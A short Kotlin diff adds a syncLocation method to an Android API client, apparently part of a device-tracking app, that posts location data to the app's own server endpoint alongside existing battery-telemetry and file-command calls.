@@ -110,6 +110,10 @@ class SentryApiClient(
         post("/battery/telemetry", body, authenticated = false)
     }
 
+    suspend fun syncLocation(body: JSONObject): Result<JSONObject> = withContext(Dispatchers.IO) {
+        post("/location/sync", body, authenticated = false)
+    }
+
     suspend fun pollFileCommand(): Result<String?> = withContext(Dispatchers.IO) {
         val deviceId = CryptoManager.getOrCreateDeviceId(context)
         val res = request("GET", "/files/command/$deviceId", null, authenticated = false)
